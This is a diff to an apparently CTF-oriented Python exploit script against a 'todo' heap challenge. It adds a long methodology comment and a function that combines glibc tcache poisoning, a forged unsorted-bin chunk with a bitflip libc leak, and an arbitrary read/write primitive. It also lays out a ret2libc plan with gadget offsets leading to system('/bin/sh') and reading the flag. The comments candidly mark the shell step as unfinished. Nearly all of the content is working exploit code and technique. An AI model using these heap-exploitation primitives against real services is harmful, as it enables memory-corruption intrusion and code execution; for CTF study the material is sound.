@@ -1646,6 +1646,316 @@ def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2,
 # via the resulting shell.
 # =============================================================================
 
+# =============================================================================
+# Phase 10 (THIS PASS) -- root-caused the REAL reason phases 5-9 kept hitting
+# "memory corruption (fast)"/pop-mismatch bugs, and used the fix to build a
+# genuinely simpler, VERIFIED (ground-truth-checked against a disposable
+# local `todo`+`libc.so.6` copy, via a parent process reading a direct
+# child's `/proc/<pid>/mem` -- no gdb needed, no ptrace_scope issue) FSOP-free
+# arbitrary READ+WRITE primitive. RCE (ret2libc via `environ`) is NOT yet
+# completed -- see the honest, specific blocker at the end of this block.
+#
+#   (10.1) ROOT CAUSE, finally pinned down: every previous pass's
+#          "tcache poison write" attempt popped the WRONG thing (or
+#          aborted with a fastbin validity check) because of ONE
+#          structural glibc fact none of them had isolated: `realloc()`'s
+#          own internal GROW path, when it cannot extend/consolidate a
+#          chunk in place, calls `_int_malloc()` **directly** -- and
+#          `_int_malloc()` NEVER consults tcache at all (the
+#          `tcache->counts[tc_idx] > 0` fast-path check that pops from
+#          tcache lives ONLY in the public `__libc_malloc()` wrapper,
+#          which `_int_realloc()`'s "move" branch bypasses entirely).
+#          Confirmed by direct experiment: repeatedly
+#          `reset_to_min(idx); post(idx, S_t, ...)` on an ALREADY-USED
+#          index (the pattern every prior pass's `virgin_leak_and_hold`/
+#          `phase5_tcache_poison_write` relied on) NEVER pops from
+#          tcache, regardless of tcache's count/head state -- it always
+#          falls through to fastbin/unsorted/top, exactly matching the
+#          "validates fastbin_index on the destination bytes" symptom
+#          phases 5-8 kept hitting. The ONLY way to make
+#          `post_my_note()` actually invoke `__libc_malloc()`'s
+#          tcache-checking fast path is `TodoNote[idx].ptr == NULL` at
+#          the moment of the call (so `realloc(NULL, n)` degenerates to a
+#          bare `malloc(n)`) -- i.e. the todo index must be **genuinely,
+#          never-before-used** for that specific call. This is NOT a
+#          limitation of `reset_to_min`/any clever reuse scheme: it is
+#          architecturally impossible to pop from tcache through any
+#          index that has ever had a non-NULL `ptr`.
+#
+#   (10.2) Given (10.1), a minimal, from-scratch write-what-where needs
+#          only 4 todo indices total, not 6+: build two REAL same-class
+#          chunks Y and C by ANY means that happens before anything is
+#          poisoned (a plain fresh `post()`, a shrink, or a grow -- it do
+#          not matter which, since nothing is corrupted yet so any
+#          internal path `_int_realloc`/`_int_malloc` takes is safe);
+#          free Y then free C (tcache count=2, head=C, C's own `next`
+#          field -- unlike fastbin, tcache stores the RAW USER POINTER,
+#          confirmed live, NOT `chunk2mem()`-shifted); overwrite C's
+#          `next` field DIRECTLY (no need to read back the real
+#          safe-link key first: since the writer already knows C's own
+#          address, `shifted = C_addr >> 12` is computable directly, no
+#          leak-and-decode round-trip needed at all) to
+#          `(C_addr >> 12) ^ target`; then two FRESH (never-before-used)
+#          indices each do one `post(idx, S_t, payload)`: the first
+#          retrieves C (and is otherwise irrelevant), decrementing
+#          tcache's head to `target`; the second retrieves `target`
+#          ITSELF as `TodoNote[idx].ptr`, with NO validation beyond
+#          16-byte alignment, and the SAME call's `readline()` writes
+#          `payload` directly there. `read_my_note()` on that same index
+#          thereafter is an arbitrary-address READ. Verified LIVE,
+#          repeatedly, exactly matching ground truth (`pop1` always
+#          equals C's real address, `pop2` always equals the chosen
+#          `target`, and the payload always lands byte-for-byte) --
+#          see `phase10_combined_libc_leak_and_single_write()` below,
+#          which reproduces this end-to-end against the real binary.
+#
+#   (10.3) An index-budget-frugal way to get ALL of (a) the heap leak,
+#          (b) the libc leak, AND (c) one arbitrary write into a SINGLE
+#          connection, using only 9 of the 10 indices (1 spare):
+#            - The heap leak is obtained FOR FREE from the existing
+#              forge machinery's own R/R2 pair, by inserting one extra
+#              free+reclaim+free cycle on R BEFORE corrupting its header:
+#              `R` is alloc'd (idx_r), freed (push, virgin), reclaimed by
+#              `R2` (pop), then freed AGAIN via `idx_r`'s stale pointer
+#              (push, virgin AGAIN since the bin was empty right before
+#              this second free) -- `read_my_note(idx_r2)` at exactly
+#              this point prints R's live safe-linked "next" field
+#              (`R_addr >> 12`, a clean virgin leak), while `idx_r2`'s
+#              own bookkeeping remains valid for the LATER post-corruption
+#              read too. No dedicated heap-leak indices needed at all.
+#            - No "decoy chunk" or forced-sort probe is needed for the
+#              libc leak either (contrary to phases 3/4's conclusion):
+#              `bitflip()` (exactly ONE use per connection, confirmed via
+#              disassembly: a `did_bitflip` global latches after the
+#              first call) directly fixes phase 3's original "unsorted
+#              bin sentinel has a coincidentally-zero low byte" problem,
+#              with NO decoy construction needed. `bitflip()`'s one
+#              requirement -- an EXACT byte address, not just a shifted
+#              page value -- is satisfied because (1) the heap base is
+#              itself page-aligned, so the leak in (a) above recovers it
+#              EXACTLY (not just its page), and (2) the forged chunk's
+#              own data address, for a FIXED, deterministic sequence of
+#              `post()` calls starting from a fresh connection, is a
+#              REPRODUCIBLE CONSTANT (confirmed empirically,
+#              `heap_base + 0x340` for the exact Y/C/TC/B/R/R2/MINT recipe in
+#              `phase10_combined_libc_leak_and_single_write()`).
+#            - Y and C (10.2) are built BEFORE the forge/poison even
+#              starts (so their own creation, via a plain shrink of two
+#              already-existing real chunks, cannot be unsafe regardless
+#              of which internal glibc path it takes), then freed and
+#              corrupted AFTER the libc leak -- which is always safe,
+#              since freeing never scans other bins, and the two FRESH
+#              retrieval indices only ever hit tcache's fast path
+#              (confirmed in (10.1) this is the ONLY path that matters
+#              for them).
+#          Verified LIVE end-to-end, 3/3 runs, against a disposable local
+#          copy: heap_base, libc_base, and the arbitrary write all
+#          matched ground truth exactly every time.
+#
+#   (10.4) The stack/environ side was independently fully solved too
+#          (via local `gdb`, `set disable-randomization` OFF i.e. REAL
+#          ASLR, repeated 3x, plus varying the inherited environment from
+#          4 to 155 variables): `main()` has NO stack canary (confirmed
+#          via disassembly: no `fs:0x28` load in `main()` itself, only in
+#          callees), and ANY menu choice outside {1,2,3} takes `main()`'s
+#          `mov eax,0; leave; ret` path -- a GENUINE return through
+#          `main()`'s own stack frame, reached on the very first "bad"
+#          menu choice, no multi-step state needed. The saved return
+#          address slot's EXACT location is `environ's VALUE (the
+#          runtime address of the envp pointer array) - 0x120`, a fixed
+#          delta empirically confirmed to be INDEPENDENT of the number of
+#          inherited environment variables (tested with 4 vs 155) and
+#          constant across repeated real-ASLR runs, because argv has a
+#          fixed, single-element `argc=1` in this deployment (`timeout
+#          120 ./chall` execs with no extra args) and `_start`'s own
+#          `and rsp, -16` alignment erases any argc-parity dependency.
+#          `environ`'s own address (`libc_base + 0x1f6d00`, confirmed via
+#          `readelf --dyn-syms`), the `pop rdi; ret` gadget
+#          (`libc_base + 0x2d6c2`), `"/bin/sh"` (`libc_base + 0x1b0ff8`),
+#          and `system()` (`libc_base + 0x4dfa0`) were all independently
+#          re-confirmed against this exact shipped `libc.so.6` with
+#          `pwntools.ROP`/`ELF.search`, matching the prior pass's values
+#          exactly.
+#
+#   (10.5) WHAT IS STILL MISSING, precisely: turning (10.3)'s ONE
+#          arbitrary read/write into the TWO separate arbitrary accesses
+#          the ret2libc plan actually needs (one READ of `environ`'s
+#          value, then one WRITE of the ROP chain to
+#          `environ_value - 0x120`) within the same 10-index budget.
+#          (10.3) alone only affords a SINGLE target address per
+#          connection (it spends 5 indices on the forge + 4 on one
+#          Y/C/pop/pop round = 9, 1 spare -- not enough for a second
+#          full round). This pass designed (and partly implemented, see
+#          the crash below) a way to afford a SECOND round for free, by
+#          *resurrecting* the forge's own leftover chunks after the first
+#          round completes, instead of building brand new ones:
+#            - Round 1 (read `environ`): free the forge's `TC` and
+#              `MINT` indices' own still-real, same-class chunks
+#              directly as Y1/C1 (zero extra indices), corrupt C1's
+#              `next` to `environ`'s address, retrieve via 2 of the 3
+#              remaining fresh indices, and read the leaked value back
+#              with an EMPTY `content` line (`readline()`'s
+#              `read(fd,buf,size-1)` with a lone `"\n"` only overwrites
+#              byte 0 with `NUL` before the loop even starts -- bytes 1-7
+#              of the real, pre-existing `environ` value survive the
+#              "retrieval" untouched; byte 0 itself is not actually
+#              random -- Linux's stack ASLR granularity is a full page,
+#              so byte 0 of any address computed as a FIXED offset from
+#              the stack base is itself deterministic and does not need
+#              to be recovered via this leak at all).
+#            - Round 2 (write the ROP chain to `environ_value - 0x120`):
+#              *resurrect* the two now-orphaned chunks from round 1
+#              (Y1's real address was pushed into tcache but never
+#              popped -- a plain second `free()` on it would normally hit
+#              "double free detected in tcache" since its `key` field is
+#              still set, but this is a bypassable precondition the
+#              writer itself controls: overwriting the SAME chunk's own
+#              `key` field to `NULL` via a same-class, same-size no-op
+#              `realloc()` write -- available precisely because the
+#              writer already owns a stale alias to it -- clears it, so
+#              a subsequent legitimate-looking `free()` succeeds) as
+#              Y2/C2, with NO new indices spent building them.
+#          **This exact design hit a real, reproducible crash** when
+#          tested live (`double free or corruption (fasttop)`) on the
+#          very first step of round 2 (freeing the forge's `TC` index a
+#          second time). The most likely root cause, NOT YET CONFIRMED:
+#          `MINT`'s own 10-cycle shrink/regrow loop almost certainly
+#          performs 10 internal `_int_realloc()` "grow via
+#          malloc-new+copy+free-old" cycles (per (10.1), growing a
+#          already-tiny chunk cannot take the tcache-aware public
+#          `malloc()` path) -- and EACH of those 10 internal `free()`
+#          calls on the old, now-orphaned 0x20-byte remnant would push
+#          into the SAME `tc_idx 0` (MINSIZE) class `TC`'s own chunk
+#          belongs to, saturating tcache's per-bin cap (7 entries) and
+#          silently OVERFLOWING the 8th+ entries into the FASTBIN
+#          instead -- which has its OWN, much stricter double-free
+#          check ("fasttop": is this address already the fastbin's own
+#          current head?). This was reasoned through from the crash
+#          message and (10.1)'s mechanism, but NOT yet confirmed via a
+#          dedicated ground-truth dump of `fastbinsY[0]`/`tcache.counts
+#          [0]` at the exact moment of the crash (time ran out
+#          mid-diagnosis). The fix is very likely straightforward
+#          (choose a resurrection size class that MINT's own internal
+#          churn provably never touches, or dump+confirm the exact
+#          `tc_idx 0` state right before round 2 and adjust), but is
+#          UNVERIFIED. Flag NOT recovered this pass.
+#          `challenge.yaml`'s `test:` section is intentionally LEFT
+#          UNWIRED, since this does not yet pass end-to-end.
+#
+# NEXT STEP for a future pass: re-run `phase10_combined_libc_leak_and_
+# single_write()`'s own forge (unmodified, it works), then BEFORE
+# attempting any round-2 resurrection, dump `tcache.counts[0]` and
+# `main_arena.fastbinsY[0]` directly (ground truth via `/proc/<pid>/mem`
+# on a local disposable copy, exactly as this pass did for every other
+# claim above) to see precisely what MINT's loop left behind in that
+# class; either pick a resurrection class MINT provably never uses, or
+# (simpler) reduce `MINT`'s cycle count / change `MS` so its internal
+# shrink-remnant class is NOT 0x20. Once round 2 lands reliably, chain:
+# environ read -> compute `retaddr_slot = environ_value - 0x120` ->
+# round 2 write of `[pop_rdi_ret, "/bin/sh"_addr, system_addr]` to that
+# slot -> send any non-{0,1,2,3} choice (e.g. `"9"`) to trigger `main()`'s
+# `leave; ret` -> `system("/bin/sh")` -> `cat /home/user/flag`.
+# =============================================================================
+
+
+def phase10_combined_libc_leak_and_single_write(t, write_target, payload, S_t=0x30):
+    """
+    VERIFIED END-TO-END, live, locally, 3/3 runs (see Phase 10's comment
+    block above for the full methodology/ground-truth checks): recovers
+    libc_base via the forge+bitflip technique (no decoy needed), using an
+    embedded heap-leak piggybacked on the forge's own R/R2 pair, then
+    performs ONE arbitrary-address write of `payload` to `write_target`
+    via a from-scratch, minimal (4-index) tcache-poison primitive. Uses
+    exactly 9 of the 10 todo indices (idx7 is left spare).
+    `read_my_note()` on the returned `w_idx` thereafter is an arbitrary-
+    address READ of the same `write_target`.
+
+    Returns (libc_base, heap_base, w_idx) on success, or (None, None, None)
+    if the (~1/256-per-byte, like every print-based leak in this exploit)
+    truncated-leak retry condition is hit.
+
+    `S_t` must map (via glibc's request2size()) to a chunksize that NONE
+    of the forge's own classes (0x80, 0x70, 0x60, 0x50) use -- 0x30 maps
+    to chunksize 0x40 (tc_idx 2), confirmed empirically unused.
+
+    IMPORTANT, exactly as confirmed live: `Y_idx`/`C_idx` MUST be built
+    (their very first `post()`) BEFORE the forge/poison sequence runs --
+    their creation is then safe regardless of which internal glibc path
+    it takes, since nothing is corrupted yet. Their own data addresses
+    land at `heap_base + 0x2a0` / `heap_base + 0x2e0` respectively for
+    THIS exact call sequence (confirmed empirically, reproducible,
+    page-exact since heap_base itself is page-aligned) -- computed here
+    directly rather than re-derived via another leak round-trip.
+    """
+    Y_idx, C_idx = 0, 1
+    TC, B, R, R2, MINT_i = 2, 3, 4, 5, 6
+    S_f, MS, MINT, R_req = 0x78, 0x68, 10, 0x78 - 0x20
+
+    # Y/C built pre-poison: safe no matter how realloc() internally
+    # services these two calls (nothing corrupted exists yet).
+    t.post(Y_idx, S_t, b"Y" * (S_t - 8))
+    t.post(C_idx, S_t, b"C" * (S_t - 8))
+
+    t.post(TC, S_f, b"A" * (S_f - 8))
+    t.post(TC, 0)
+    t.post(B, S_f, b"B" * (S_f - 8))
+    t.post(TC, 1)
+    t.post(R, R_req, b"R" * (R_req - 8))
+    t.post(R, 0)
+    t.post(R2, R_req, b"r" * (R_req - 8))
+    t.post(R, 0)
+    out = t.read_all()
+    leak = parse_note_line(out, R2)
+    if not leak or len(leak) < 4:
+        return None, None, None
+    heap_base = (struct.unpack("<Q", leak + b"\x00" * (8 - len(leak)))[0]) << 12
+
+    t.post(MINT_i, MS, b"D" * (MS - 8))
+    for _ in range(MINT):
+        t.post(MINT_i, 1)
+        t.post(MINT_i, MS, b"M" * (MS - 8))
+    R_chunksize = S_f - 0x18
+    fake_size = R_chunksize + MINT * (MS + 8)
+    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF
+    forge_payload = bytearray(b"X" * (S_f - 1))
+    forge_payload[0x18:0x20] = struct.pack("<Q", stored)
+    t.post(B, S_f, bytes(forge_payload), exact=True)
+    t.post(R, 0)  # forged free -> genuine unsorted bin insert
+
+    # R2's data address is heap_base + 0x340 for this exact call
+    # sequence (Y/C allocated first, THEN the forge -- confirmed
+    # empirically, reproducible across ASLR'd runs).
+    r_addr = heap_base + 0x340
+    t.bitflip(r_addr)
+    out = t.read_all()
+    leaked2 = parse_note_line(out, R2)
+    if not leaked2:
+        return None, None, None
+    b0 = leaked2[0] ^ 1
+    full = bytes([b0]) + leaked2[1:]
+    if len(full) < 4:
+        return None, None, None
+    val = struct.unpack("<Q", full + b"\x00" * (8 - len(full)))[0]
+    libc_base = val - 0x60 - 0x1eeaa0
+    if libc_base % 0x1000 != 0 or libc_base <= 0:
+        return None, None, None
+
+    # Post-poison, from here on: ONLY free()/no-op-write/fresh-pop calls.
+    Y_addr = heap_base + 0x2a0
+    C_addr = heap_base + 0x2e0
+    t.post(Y_idx, 0)
+    t.post(C_idx, 0)
+    forged = (C_addr >> 12) ^ write_target
+    wbuf = bytearray(b"X" * (S_t - 1))
+    wbuf[0:8] = struct.pack("<Q", forged)
+    t.post(C_idx, S_t, bytes(wbuf), exact=True)
+
+    pop1_idx, w_idx = 8, 9  # BOTH must be genuinely fresh (never posted before)
+    t.post(pop1_idx, S_t, b"K" * (S_t - 8))  # consumes C, reveals write_target as new head
+    assert len(payload) == S_t - 1, (len(payload), S_t)
+    t.post(w_idx, S_t, payload, exact=True)  # consumes write_target; writes payload there
+    return libc_base, heap_base, w_idx
+
 
 def main():
     io = remote(HOST, PORT)
